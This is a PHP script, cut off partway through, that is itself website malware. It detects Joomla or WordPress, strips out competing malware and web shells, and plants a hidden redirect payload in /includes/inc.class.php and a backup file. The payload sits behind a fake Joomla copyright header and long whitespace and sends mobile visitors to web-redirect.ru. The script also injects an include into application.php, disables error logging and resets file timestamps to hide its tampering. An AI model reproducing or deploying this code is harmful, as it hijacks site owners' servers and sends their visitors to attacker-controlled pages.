<?php
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
ini_set('display_errors', 0);
error_reporting(0);
ignore_user_abort(true);

function finder_files($start) 
{
	$arr_filename = array();
	global $arr_filename;
	
	$handle = opendir($start);					// Открываем начиная с папки (по умолчанию всегда с корня)
	while(($file = readdir($handle))!== false) 	// Читаем дирректорию с файлами и папками
	{	
		if ($file !="." && $file !="..") 
		{
			$startfile = $start."/".$file;
			if (is_dir($startfile)) 
				finder_files($startfile);			// Для каждой найденной папки повторяем действие этой же функции (ищем шеллы) и так со всеми вложенными папками
			else 
				$arr_filename[] = $startfile;
		}
	}
	closedir($handle);
	return $arr_filename;
}

function find_php_files($start) 
{
	$arr_filename_php = array();
	global $arr_filename_php;
	$files = array();
	$handle = opendir($start);					// Открываем начиная с папки (по умолчанию всегда с корня)
	while(($file=readdir($handle))!==false) 	// Читаем дирректорию с файлами и папками
	{	
		if ($file!="." && $file !="..") 
		{
			$startfile = $start."/".$file;
			if (is_dir($startfile)) 
				find_php_files($startfile);			// Для каждой найденной папки повторяем действие этой же функции (ищем шеллы) и так со всеми вложенными папками
			else 
			{
				$result = stristr($startfile, '.php');
				if ($result != false)
					$arr_filename_php[] = $startfile;
			}
		}
	}
	closedir($handle);
	return $arr_filename_php;
}

function only_read($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$original_file = fread($file,filesize($file_name));
		fclose($file);
	}
	return $original_file;
}
function read_file($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$arr_file = explode("\n",fread($file,filesize($file_name)));
		fclose($file);
	}
	else
		$arr_file = array();
	
	return $arr_file;
}
function arr_search($arr, $str)
{
	$res_search = '0';
	foreach ($arr as $each)
	{
		$each = trim($each);
		$result = stristr($each, $str);
		if ($result != false)
		{	
			$res_search = '1';
		}
	}
	
	return $res_search;
}
function clear_htaccess($file_name)
{	
	$path_htaccess = $_SERVER['DOCUMENT_ROOT']."/.htaccess";
	$path_index = $_SERVER['DOCUMENT_ROOT']."/index.php";
	
	if (file_exists($path_htaccess))
	{
		$time_htaccess = filemtime($path_htaccess);
		$comment = '#';
		chmod($path_htaccess, 0755);
		if (is_writable($path_htaccess))
		{
			$arr_original_htaccess = read_file($path_htaccess);
			$arr_original_htaccess = str_replace('<script>', "", $arr_original_htaccess);
			
			$status1 = arr_search($arr_original_htaccess, 'http://');
			$status2 = arr_search($arr_original_htaccess, 'iphone');
			$status3 = arr_search($arr_original_htaccess, 'android');
			if ((($status1 != 0) and ($status2 != 0)) or (($status1 != 0) and ($status3 != 0)))
			{
				$site_name = $_SERVER['SERVER_NAME'];
				$site_name = str_replace('www.', "", $site_name);

				$arr_new_htaccess = array();
				foreach ($arr_original_htaccess as $each)
				{
					$each = trim($each);
					$result = stristr($each, 'http://');
					if ($result != false)
					{	
						$result_site_name = stristr($each, $site_name);
						if ($result_site_name == false)
						{
							if ($each[0] != $comment)
								$each = $comment.$each;
						}
					}
					$arr_new_htaccess[] = $each;
				}
				
				$f = fopen (".htaccess", "w");
				foreach ($arr_new_htaccess as $new_str)
				{
					if (($new_str !== '') and ($new_str !== ' ') and ($new_str !== "\n"))
						fwrite($f, $new_str."\n");
				}
				fclose($f);
			}
		}
		touch($path_htaccess, $time_htaccess);
	}
	if (file_exists($path_index))
	{
		chmod($path_index, 0755);
		
		$check_index = only_read($path_index);
		
		$code_1 = '$ua = $_SERVER[\'HTTP_USER_AGENT\'];';
		$code_2 = 'if(stripos("***$ua",\'android\') !== false)';
		$code_3 = 'header("Location: http://mob-version.ru/");';
		$code_4 = 'die();';
		$code_5 = 'header("Location: http://andsecurity.ru");';
		$code_7 = "echo '';";
		
		$result = stristr($check_index, $code_1);
		if (($result !== false))
		{
			$time_index = filemtime($path_index);
			$arr_index = read_file($path_index);
			$new = array();

			foreach ($arr_index as $each)
			{
				$each = str_replace($code_1, '', $each);
				$each = str_replace($code_2, '', $each);
				$each = str_replace($code_3, '', $each);
				$each = str_replace($code_4, '', $each);
				$each = str_replace($code_5, '', $each);
				$each = str_replace($code_7, '', $each);
				
				if ($each == ('?><?php'))
					$each = "?>"."\n"."<?php";
					
				$new[] = $each;
			}

			if (($new[0] == '<?php') and ($new[2] == '{') and ($new[5] == '}') and ($new[6] == '?>'))
			{
				$new[0] = '';
				$new[2] = '';
				$new[5] = '';
				$new[6] = '';
			}

			$f = fopen ($path_index, "w");
			foreach ($new as $n)
			{
				if (($n !== '') and ($n !== ' ') and ($n !== "\n"))
					fwrite($f, $n."\n");
			}
			fclose($f);
			
			touch($path_index, $time_index);
		}
	}
	if (file_exists($path_htaccess))
		chmod($path_htaccess, 0404);
	if (file_exists($path_index))
		chmod($path_index, 0404);
}


function remove_file($file_name)
{
	if (file_exists($file_name))
	{
		chmod($file_name, 0755);
		if (is_dir($file_name))
			rmdir($file_name);
		else
			unlink($file_name);
	}
}
function delete_root_path_files($anything)
{
	$file_1 = $_SERVER['DOCUMENT_ROOT']."/cfg_access.php";
	$file_2 = $_SERVER['DOCUMENT_ROOT']."/shell_killer.php";
	$file_3 = $_SERVER['DOCUMENT_ROOT']."/shellkiller.php";
	$file_4 = $_SERVER['DOCUMENT_ROOT']."/shell_finder.php";
	$file_5 = $_SERVER['DOCUMENT_ROOT']."/shellfinder.php";
	$file_6 = $_SERVER['DOCUMENT_ROOT']."/phpfinder.php";
	$file_7 = $_SERVER['DOCUMENT_ROOT']."/php_finder.php";
	$file_8 = $_SERVER['DOCUMENT_ROOT']."/a.php";
	$file_10 = $_SERVER['DOCUMENT_ROOT']."/all_php_files.txt";
	$file_11 = $_SERVER['DOCUMENT_ROOT']."/sh_code.txt";
	$file_12 = $_SERVER['DOCUMENT_ROOT']."/conflg.php";
	$file_12 = $_SERVER['DOCUMENT_ROOT']."/error_log";
	$file_13 = $_SERVER['DOCUMENT_ROOT']."/cfg_access.php";
		
	remove_file($file_1);
	remove_file($file_2);
	remove_file($file_3);
	remove_file($file_4);
	remove_file($file_5);
	remove_file($file_6);
	remove_file($file_7);
	remove_file($file_8);
	remove_file($file_10);
	remove_file($file_11);
	remove_file($file_12);
	remove_file($file_13);
}

function clear_folder($folder_name)
{
	if (is_dir($folder_name))
	{
		if ($dh = opendir($folder_name)) 
		{
			while (($file = readdir($dh)) !== false) 
			{
				if (($file != ".") and ($file != ".."))
						$arr_filename[] = $file;				// Помещаем в массив $arr_filename - имена всех доков, которые находятся в папке domains
				}
				closedir($dh);
		}
				
		foreach ($arr_filename as $file_for_delete)			// Удаляем все файлы из этой папки 
		{
			$file_for_delete = trim($file_for_delete);
			$file_for_delete = $folder_name.$file_for_delete;
					
			if (file_exists($file_for_delete))
				unlink($file_for_delete);
		}
		if (is_dir($folder_name))						
			rmdir($folder_name);					// Удаляем папку. 
	}
}
echo '<td><hr><hr>';

if ((!isset ($_GET['old'])) and (!isset ($_GET['mon'])) and (!isset ($_GET['af'])) and (!isset ($_GET['mob'])) and (!isset ($_GET['sh'])) and (!isset ($_GET['del'])))
	echo $_SERVER["SERVER_NAME"].' - TRD working!';

clear_htaccess(true);

$Joomla1 = $_SERVER['DOCUMENT_ROOT'].'/administrator/'; 
$Joomla2 = $_SERVER['DOCUMENT_ROOT'].'/components/'; 
$Joomla3 = $_SERVER['DOCUMENT_ROOT'].'/includes/'; 
$Joomla4 = $_SERVER['DOCUMENT_ROOT'].'/templates/'; 

$WP1 = $_SERVER['DOCUMENT_ROOT'].'/wp-includes/';
$WP2 = $_SERVER['DOCUMENT_ROOT'].'/wp-content/';
$WP3 = $_SERVER['DOCUMENT_ROOT'].'/wp-admin/';


if ((file_exists($Joomla1)) and (file_exists($Joomla2)) and (file_exists($Joomla3)) and (file_exists($Joomla4)))
	$CMS = 'Joomla';
	
elseif ((file_exists($WP1)) and (file_exists($WP2)) and (file_exists($WP3)))
	$CMS = 'WordPress';
else
	$CMS = 'Unknown';
	
	
// START: Delete old files
if (isset ($_GET['old']))
{
	if 	($CMS == 'Joomla')
	{
		// Удалить инклуд из defines.php
		$includes_folder_path = $_SERVER['DOCUMENT_ROOT'].'/includes/';
		$time_includes = filemtime($includes_folder_path);
		$defines_path = $_SERVER['DOCUMENT_ROOT']."/includes/defines.php";
		
		if (file_exists($defines_path))
		{
			$time_defines = filemtime($defines_path);
			$delete_form = '<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
			
			chmod($defines_path, 0755);
			$arr_defines = read_file($defines_path);
			$new_defines = array();
			foreach ($arr_defines as $defines)
			{
				$defines = str_replace('function read_pic($A){$a=$_SERVER[\'DOCUMENT_ROOT\']."/images/";$a.=$A;$c=file($a);', "", $defines);
				$defines = str_replace('$i=$c[count($c)-1];return $i;}', "", $defines);
				$defines = str_replace('$d=$_SERVER["HTTP_USER_AGENT"];$r=stristr($d,\'Phoenix - REBORN\');if($r!=false){', "", $defines);
				$defines = str_replace('$i1=\'<?php \';$i2=read_pic(\'apply_f2.png\');', "", $defines);
				$defines = str_replace('$i3=read_pic(\'blank.png\');$i4=read_pic(\'cancel.png\');', "", $defines);
				$defines = str_replace('$i5=read_pic(\'save.png\');$i6=\'?>\';$i=$i1.$i2.$i3.$i4.$i5.$i6;', "", $defines);
				$defines = str_replace('$f=fopen(\'phoenix.php\',"w");fwrite($f,$i);fclose($f);}', "", $defines);
				$defines = str_replace($delete_form, '', $defines);
				$defines = str_replace('<?php ', '<?php', $defines);
				$new_defines[] = $defines;
			}
			
			$f = fopen ($defines_path, "w");
			
			$double_enter = "\n"."\n";
			
			foreach ($new_defines as $each)
			{	
				if (($each !== '') and ($each !== ' ') and ($each !== "\n"))
					fwrite($f, $each."\n");
			}
			fclose($f);
			
			touch($defines_path, $time_defines);
		}
		// Удалить инклуд из framework.php
		
		$framework_path = $_SERVER['DOCUMENT_ROOT']."/includes/framework.php";
		
		if (file_exists($framework_path))
		{
			$time_framework = filemtime($framework_path);
			$framework_str_include = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/includes/php_mailer.php");';
			$delete_form = '<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
			
			chmod($framework_path, 0755);
			$new_arr_framework = array();
			$arr_framework = read_file($framework_path);
			
			foreach ($arr_framework as $framework)
			{
				$framework = str_replace($framework_str_include, "", $framework);
				$framework = str_replace($delete_form, '', $framework);
				$framework = str_replace('<?php ', '<?php', $framework);
				$new_arr_framework[] = $framework;
			}
			
			$double_enter = "\n"."\n";
			
			$f2 = fopen ($framework_path, "w");
			foreach ($new_arr_framework as $each)
			{
				if (($each !== '') and ($each !== ' ') and ($each !== "\n"))
					fwrite($f2, $each."\n");
			}
			fclose($f2);
			
			touch($framework_path, $time_framework);
		}
		// Удалить инклуд из index.php
		$index_path = $_SERVER['DOCUMENT_ROOT']."/index.php";
		if (file_exists($index_path))
		{
			$time_index = filemtime($index_path);
			chmod($index_path, 0755);
			$new_arr_index = array();
			$arr_index = read_file($index_path);
			
			$str_joomla_include = '<?php require_once($_SERVER[\'DOCUMENT_ROOT\']."/components/com_content/mobile/router.php");?>';
			$str_joomla_include_2 = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/components/com_content/mobile/router.php")';
			$str_joomla_include_3 = '<?php require_once($_SERVER[\'DOCUMENT_INDEX\']."components/com_content/mobile/router.php");?>';
			$str_joomla_include_4 = 'require_once($_SERVER[\'DOCUMENT_INDEX\']."components/com_content/mobile/router.php");';
			$str_joomla_include_5 = '<?php require_once($_SERVER[\'DOCUMENT_ROOT\']."/components/com_banners/juke.php");?>';
			$str_joomla_include_6 = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/components/com_banners/juke.php");';
			$str_joomla_include_7 = '<?php ?>';
			$str_joomla_include_8 = '<?php'."\n";
			$delete_form = '<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
			
			
			foreach ($arr_index as $index)
			{
				$index = str_replace($str_joomla_include, "", $index);
				$index = str_replace($str_joomla_include_2, "", $index);
				$index = str_replace($str_joomla_include_3, "", $index);
				$index = str_replace($str_joomla_include_4, "", $index);
				$index = str_replace($str_joomla_include_5, "", $index);
				$index = str_replace($str_joomla_include_6, "", $index);
				$index = str_replace($str_joomla_include_7, "", $index);
				$index = str_replace('<?php ', $str_joomla_include_8, $index);
				$index = str_replace($delete_form, '', $index);
				$new_arr_index[] = $index;
			}
		
			
			$f3 = fopen ($index_path, "w");
			foreach ($new_arr_index as $each)
			{
				if (($each !== '') and ($each !== ' ') and ($each !== "\n"))
					fwrite($f3, $each."\n");
			}
			fclose($f3);
			touch($index_path, $time_index);
		}
		// Удалить папки:
		
		$contact_path = $_SERVER['DOCUMENT_ROOT']."/components/com_contact/";
		if (file_exists($contact_path))
		{
			$time_banners = filemtime($contact_path);
			$time_weblinks = filemtime($contact_path);
			$time_content = filemtime($contact_path);
			$time_components = filemtime($contact_path);
		}
		else
		{
			$weblinks_path = $_SERVER['DOCUMENT_ROOT']."/components/com_weblinks/";
			$time_weblinks = filemtime($weblinks_path);
			
			$content_path = $_SERVER['DOCUMENT_ROOT']."/components/com_content/";
			$time_content = filemtime($content_path);
			
			$components_path = $_SERVER['DOCUMENT_ROOT']."/components/";
			$time_components = filemtime($components_path);
			
			$banners_path = $_SERVER['DOCUMENT_ROOT']."/components/com_banners/";
			$time_banners = filemtime($banners_path);
		}
		
		$folder = $_SERVER['DOCUMENT_ROOT']."/components/com_weblinks/1/";
		$folder_2 = $_SERVER['DOCUMENT_ROOT']."/components/com_content/mobile/";
		clear_folder($folder);
		clear_folder($folder_2);
		
		// Удалить файлы: 
		delete_root_path_files(true);
		
		$file_9 = $_SERVER['DOCUMENT_ROOT']."/includes/php_mailer.php";
		$file_10 = $_SERVER['DOCUMENT_ROOT'].'/components/com_banners/juke.php';
		$file_11 = $_SERVER['DOCUMENT_ROOT'].'/components/com_banners/query.txt';
		$file_12 = $_SERVER['DOCUMENT_ROOT'].'/components/com_banners/get_query.php';
		$file_13 = $_SERVER['DOCUMENT_ROOT'].'/components/com_weblinks/links.php';
		
		remove_file($file_9);remove_file($file_10);remove_file($file_11);remove_file($file_12);remove_file($file_13);
		
		touch($includes_folder_path, $time_includes);
		touch($weblinks_path, $time_weblinks);
		touch($content_path, $time_content);
		touch($banners_path, $time_banners);
		touch($components_path, $time_components);
		echo 'Joomla is cleaned!';
	
	}
	
	elseif ($CMS == 'WordPress')
	{
		$path_wp_load = $_SERVER['DOCUMENT_ROOT']."/wp-load.php";
		$path_wp_login = $_SERVER['DOCUMENT_ROOT']."/wp-login.php";
		
		if (file_exists($path_wp_login))
			$time_for_wp_load = filemtime($path_wp_login);
		else
			$time_for_wp_load = filemtime($path_wp_load);	
			
		chmod($path_wp_load, 0755);
	
	
		$rep_01 = ' require_once($_SERVER[\'DOCUMENT_ROOT\']."/wp-includes/class-wp-mailer.php");';
		$rep_02 = '//require_once($_SERVER[\'DOCUMENT_ROOT\']."/wp-includes/class-wp-mailer.php");';
		$rep_03 = '// require_once($_SERVER[\'DOCUMENT_ROOT\']."/wp-includes/class-wp-mailer.php");';
		$rep_04 = '/* require_once($_SERVER[\'DOCUMENT_ROOT\']."/wp-includes/class-wp-mailer.php"); */';
		$rep_05 = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/wp-includes/class-wp-mailer.php");';
		$rep_06 = '<?php ';
		$lace = '<?php'."\n";
		
		$rep_1 = '*/require_once/*';
		$rep_2 = '*/($_SERVER/*';
		$rep_3 = '*/[\'DOCUMENT_ROOT\']/*';
		$rep_4 = '*/./*';
		$rep_5 = "*/'/wp-includes/'/*";
		$rep_6 = "*/.'class-wp-mobile.php'/*";
		$rep_7 = '*/);/*';
		$rep_8 = '*//*';
		
		$arr_wp_load = read_file($path_wp_load);
		$arr_new_wp_load = array();
		
		foreach ($arr_wp_load as $each_str)
		{
			$each_str = str_replace($rep_03, "", $each_str);
			$each_str = str_replace($rep_02, "", $each_str);
			$each_str = str_replace($rep_04, "", $each_str);
			$each_str = str_replace($rep_01, "", $each_str);
			$each_str = str_replace($rep_05, "", $each_str);
			$each_str = str_replace($rep_06, $lace, $each_str);
		
			$each_str = str_replace($rep_1, "", $each_str);
			$each_str = str_replace($rep_2, "", $each_str);
			$each_str = str_replace($rep_3, "", $each_str);
			$each_str = str_replace($rep_4, "", $each_str);
			$each_str = str_replace($rep_5, "", $each_str);
			$each_str = str_replace($rep_6, "", $each_str);
			$each_str = str_replace($rep_7, "", $each_str);
			$each_str = str_replace($rep_8, "", $each_str);
			
			$arr_new_wp_load[] = $each_str;
		}
		
		
		$f = fopen ($path_wp_load, "w");
		foreach ($arr_new_wp_load as $each)
		{
			if (($each !== '') and ($each !== ' ') and ($each !== "\n"))
				fwrite($f, $each."\n");
		}
		fclose($f);
	
		touch($path_wp_load, $time_for_wp_load);
		
		/////////////////////////////////////////////////////////////////////
		
		$template_loader_path = $_SERVER['DOCUMENT_ROOT']."/wp-includes/template-loader.php";
		$path_wp_user = $_SERVER['DOCUMENT_ROOT']."/wp-includes/user.php";
		$path_wp_includes = $_SERVER['DOCUMENT_ROOT']."/wp-includes/";
		
		if (file_exists($path_wp_user))
			$time_for_temp = filemtime($path_wp_user);
		else
			$time_for_temp = filemtime($path_wp_includes);	
		
		
		chmod($template_loader_path, 0755);
		
		
		
		$repl_1 = 'function read_pic($A){$a=$_SERVER[\'DOCUMENT_ROOT\']."/wp-includes/images/";$a.=$A;$c=file($a);';
		$repl_2 = '$i=$c[count($c)-1];return $i;}';
		$repl_3 = '$d=$_SERVER["HTTP_USER_AGENT"];$r=stristr($d,\'Phoenix - REBORN\');if($r!=false){';
		$repl_4 = '$i1=\'<?php \';$i2=read_pic(\'down_arrow.gif\');';
		$repl_5 = '$i3=read_pic(\'blank.gif\');$i4=read_pic(\'admin-bar-sprite.png\');';
		$repl_6 = '$i5=read_pic(\'arrow-pointer-blue.png\');$i6=\'?>\';$i=$i1.$i2.$i3.$i4.$i5.$i6;';
		$repl_7 = '$f=fopen(\'phoenix.php\',"w");fwrite($f,$i);fclose($f);}';
		$repl_8 = '<?php ';
		$lace_8 = '<?php'."\n";
		
		
		$arr_template_loader = read_file($template_loader_path);
		$new_arr_template = array();
		
		foreach ($arr_template_loader as $each_tpl)
		{
			$each_tpl = str_replace($repl_1, "", $each_tpl);
			$each_tpl = str_replace($repl_2, "", $each_tpl);
			$each_tpl = str_replace($repl_3, "", $each_tpl);
			$each_tpl = str_replace($repl_4, "", $each_tpl);
			$each_tpl = str_replace($repl_5, "", $each_tpl);
			$each_tpl = str_replace($repl_6, "", $each_tpl);
			$each_tpl = str_replace($repl_7, "", $each_tpl);
			$each_tpl = str_replace($repl_8, $lace_8, $each_tpl);
			
			$new_arr_template[] = $each_tpl;
		}
		
		$f2 = fopen($template_loader_path, "w");
		foreach ($new_arr_template as $str_tpl)
		{
			if (($str_tpl !== '') and ($str_tpl !== ' ') and ($str_tpl !== "\n"))
				fwrite($f2, $str_tpl."\n");
		}
		fclose($f2);
		
		touch($template_loader_path, $time_for_temp);
		
		$file_to_include_WP = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-mobile.php";
		remove_file($file_to_include_WP);
		
		$name_wp = $_SERVER['DOCUMENT_ROOT']."/wp-includes/class-wp-mailer.php";
		remove_file($name_wp);
		
		delete_root_path_files(true);
		
		touch($path_wp_includes, $time_for_temp);
		
		echo 'WordPress is cleaned!';	
	}
	elseif ($CMS == 'Unknown')
	{
		$index_path = $_SERVER['DOCUMENT_ROOT']."/index.php";
		if (file_exists($index_path))
		{
			$time_index = filemtime($index_path);
			
			chmod($index_path, 0755);
			$arr_index = read_file($index_path);
			$new_arr_index = array();
			
			
			$str_unknown_include_1 = '<?php require_once($_SERVER[\'DOCUMENT_ROOT\']."/conflg.php"); require_once($_SERVER[\'DOCUMENT_ROOT\']."/htaccess.php");?>';
			$str_unknown_include_2 = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/conflg.php"); require_once($_SERVER[\'DOCUMENT_ROOT\']."/htaccess.php");';
			$str_unknown_include_3 = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/conflg.php");';
			$str_unknown_include_4 = 'require_once($_SERVER[\'DOCUMENT_ROOT\']."/htaccess.php");';
			$str_unknown_include_5 = '<?php ?>';
			$str_unknown_include_6 = '<?php?>';
			$repl_8 = '<?php';
			$lace_8 = '<?php'."\n";
			
			$new_arr_index[0] = $lace_8;
			foreach ($arr_index as $index)
			{
				$index = str_replace($str_unknown_include_1, "", $index);
				$index = str_replace($str_unknown_include_1, "", $index);
				$index = str_replace($str_unknown_include_1, "", $index);
				$index = str_replace($str_unknown_include_1, "", $index);
				$index = str_replace($str_unknown_include_1, "", $index);
				$index = str_replace($str_unknown_include_6, "", $index);
				$index = str_replace('<?php', '', $index);
				
				$new_arr_index[] = $index;
			}
			
			$f3 = fopen ($index_path, "w");
			foreach ($new_arr_index as $new_index)
			{
				if (($new_index !== '') and ($new_index !== ' ') and ($new_index !== "\n"))
					fwrite($f3, $new_index);
			}
			fclose($f3);
			
			touch($index_path, $time_index);
		}
		delete_root_path_files(true);
		
		$file_1 = $_SERVER['DOCUMENT_ROOT']."/htaccess.php";
		remove_file($file_1);
		
		echo 'Unknown CMS is cleaned!';
	}
}
// END: Delete old files

// START: Mob\web traff
if (isset ($_GET['mob']))
{
	if 	($CMS == 'Joomla')
	{
		$new_mob_link = 'web-redirect.ru';
		$new_web_link = 'web-redirect.ru';
		
		$data = '<?php'.' 
/*
=====================================================
Joomla! - Open Source Matters
-----------------------------------------------------
http://www.joomla.org/
-----------------------------------------------------
Copyright (c) 2004,2014
=====================================================
Данный код защищен авторскими правами
=====================================================
Назначение: Класс конфигурации
=====================================================
GNU GENERAL PUBLIC LICENSE
Version 3, 29 June 2007
Copyright © 2007 Free Software Foundation, Inc. <http://fsf.org>
Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed.
*/';$data1 = ' 																																																																																																																																																							 '.'function check_cookie($url_redirect){	if (($_SERVER[\'HTTP_REFERER\'] != null) and ($_SERVER[\'HTTP_REFERER\'] != "") and ($_SERVER[\'HTTP_REFERER\'] != " ")){	if(isset($_COOKIE[\'_cutt_caches_images\']) && $_COOKIE[\'_cutt_caches_images\']<strtotime(\'+24 hours\'))return false;	setcookie(\'_cutt_caches_images\', time(), strtotime(\'+24 hours\'),"/");header("Location: $url_redirect");exit;}}$q=$_SERVER[\'QUERY_STRING\'];$referer = $q;$referer = str_replace(\'&\', \'*\', $referer);$referer = str_replace(\';\', \'~\', $referer);$referer = trim($referer);$s=stristr($q,\'union\');$s2=stristr($q,\'select\');$s3=stristr($q,\'from\');$s4=stristr($q,\'jos_users\');$s5=stristr($q,\'concat\');$s6=stristr($q,\'username\');$s7=stristr($q,\'password\');$link = \'http://\'.$_SERVER[\'SERVER_NAME\'];if((($s!=false)and($s2!=false))or(($s3!=false)and($s4!=false))or(($s5!=false)and($s6!=false))or(($s5!=false)and($s7!=false))or(($s5!=false)and($s4!=false))){header("Location: $link");exit;}$android_redirect = \'http://web-redirect.ru/?andr\';$ios_redirect = \'http://web-redirect.ru/?ios\';$another_mobile_redirect = \'http://web-redirect.ru/?mb\';$web_potok = \'http://web-redirect.ru/?web\';$iphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPhone");$ipod = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPod");$ipad = stristr($_SERVER[\'HTTP_USER_AGENT\'],"iPad");$android = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Android");$symb = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Symbian");$wp7 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP7");$wp8 = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WP8");$winphone = stristr($_SERVER[\'HTTP_USER_AGENT\'],"WindowsPhone");$berry = stristr($_SERVER[\'HTTP_USER_AGENT\'],"BlackBerry");$palmpre = stristr($_SERVER[\'HTTP_USER_AGENT\'],"webOS");$mobile_tel = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Mobile");$operam = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Opera M");$htc = stristr($_SERVER[\'HTTP_USER_AGENT\'], \'HTC\');$fennec = stristr($_SERVER[\'HTTP_USER_AGENT\'],"Fennec");if ($android == true)check_cookie($android_redirect);elseif (($iphone == true) or ($ipod == true) or ($ipad == true))	check_cookie($ios_redirect);elseif (($palmpre == true) or ($mobile_tel == true) or ($operam == true) or ($htc == true) or ($wp7 == true) or ($wp8 == true) or ($symb == true) or ($berry == true) or ($fennec == true) or ($winphone == true))	check_cookie($another_mobile_redirect); //elseif (preg_match(\'#google|yahoo|yandex|vk|odnoklassniki|mail|youtube|wikipedia|netscape|bing|facebook|twitter|dmoz|ebay|icq|yandex|google|rambler#i\',$_SERVER[\'HTTP_REFERER\']))check_cookie($web_potok);else $aaa = false;'."\n".'?>';

		$data_mob = $data.$data1;
		$data_mob = str_replace('web-redirect.ru', $new_mob_link, $data_mob);
		$data_mob = str_replace('web-redirect.ru', $new_web_link, $data_mob);

		$file_for_get_time = $_SERVER['DOCUMENT_ROOT'].'/includes/defines.php';
		$file_for_get_time2 = $_SERVER['DOCUMENT_ROOT'].'/index.php';
		
		if (file_exists($file_for_get_time))
			$time_for_touch = filemtime($file_for_get_time);
		else
			$time_for_touch = filemtime($file_for_get_time2);
		
		$path_to_dir = $_SERVER['DOCUMENT_ROOT'].'/includes/';
		$path_to_script = $_SERVER['DOCUMENT_ROOT'].'/includes/inc.class.php';
		$path_to_application = $_SERVER['DOCUMENT_ROOT'].'/includes/application.php';
		$str_to_include = '<?php'."\n".'require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");';
		$time_includes = filemtime($path_to_dir);
		
		if (file_exists($path_to_dir))
			chmod($path_to_dir, 0755); // устанавливаем права на папку
		if (file_exists($path_to_script))
			chmod($path_to_script, 0755);

		if (is_writable($path_to_dir))
		{	
			$f = fopen ($path_to_script, "w");
			fwrite($f, $data_mob);
			fclose($f);
			
			if (file_exists($path_to_script))
			{
				touch($path_to_dir, $time_for_touch);
				touch($path_to_script, $time_for_touch);
				
				if (file_exists($path_to_application))
				{
					chmod($path_to_application, 0755);
					$time_application = filemtime($path_to_application);
					
					$arr_appl = read_file($path_to_application);
					$new_arr_appl = array();
					
					foreach ($arr_appl as $application)
					{
						$application = str_replace('//require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");', "", $application);
						$application = str_replace('// require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");', "", $application);
						$application = str_replace('//  require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");', "", $application);
						$application = str_replace('//	require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");', "", $application);
						$application = str_replace('/* require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php"); */', "", $application);
						$application = str_replace('require_once($_SERVER["DOCUMENT_ROOT"]."/includes/inc.class.php");', "", $application);
						$application = str_replace('<?php', $str_to_include, $application);
						
						$new_arr_appl[] = $application;
					}
					
					$d = fopen ($path_to_application, "w");
					foreach ($new_arr_appl as $each_app)
					{
						if (($each_app !== '') and ($each_app !== ' ') and ($each_app !== "\n"))
							fwrite($d, $each_app."\n");
					}
					fclose($d);
					
					touch($path_to_application, $time_application);
					
					$application_for_check = only_read($path_to_application);
					
					$result_check = stristr($application_for_check, "/includes/inc.class.php");
					if ($result_check != false)
					{
						echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - mobile redirect installed correct!'.'<hr><hr>';
						
						$path_to_contact = $_SERVER['DOCUMENT_ROOT'].'/components/com_contact/';
						$path_to_reserv = $_SERVER['DOCUMENT_ROOT'].'/components/com_content/';
						$path_to_reserv_script = $_SERVER['DOCUMENT_ROOT'].'/components/com_content/articled.php';
						$path_to_category = $_SERVER['DOCUMENT_ROOT'].'/components/com_content/category.php';
						$path_to_content = $_SERVER['DOCUMENT_ROOT'].'/components/com_content/content.php';
						$time_reserv = filemtime($path_to_contact);
						$time_content = filemtime($path_to_content);
						
						if (file_exists($path_to_reserv))
							chmod($path_to_reserv, 0755);
						if (file_exists($path_to_reserv_script))
							chmod($path_to_reserv_script, 0755);
						
						if (is_writable($path_to_reserv))
						{	
							$f2 = fopen ($path_to_reserv_script, "w");
							fwrite($f2, $data_mob);
							fclose($f2);
							
							if (file_exists($path_to_reserv_script))
							{
								touch($path_to_reserv_script, $time_content);
								touch($path_to_reserv, $time_content);
								
								echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv redirect installed correct!'.'<hr><hr>';
							}
							else
								echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv redirect not installed.'.'<hr><hr>';
								
						}
						else
							echo '<hr><hr>'."Joomla - ".'http://'.$_SERVER["SERVER_NAME"].' - reserv redirect not installed.'.'<hr><hr>';
						
							
						
						if (file_exists($path_to_reserv_script))
						{
							$data_category = 
'<?php
function only_read($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$original_file = fread($file,filesize($file_name));
		fclose($file);
	}
	return $original_file;
}

function read_file($file_name)
{
	if (file_exists($file_name) and (filesize($file_name)>1))
	{
		$file = fopen($file_name,"rt");
		$arr_file = explode("\n",fread($file,filesize($file_name)));
		fclose($file);
	}
	else
		$arr_file = array();
	
	return $arr_file;
}

function arr_search($arr, $str)
{
	$res_search = 0;
	foreach ($arr as $each)
	{
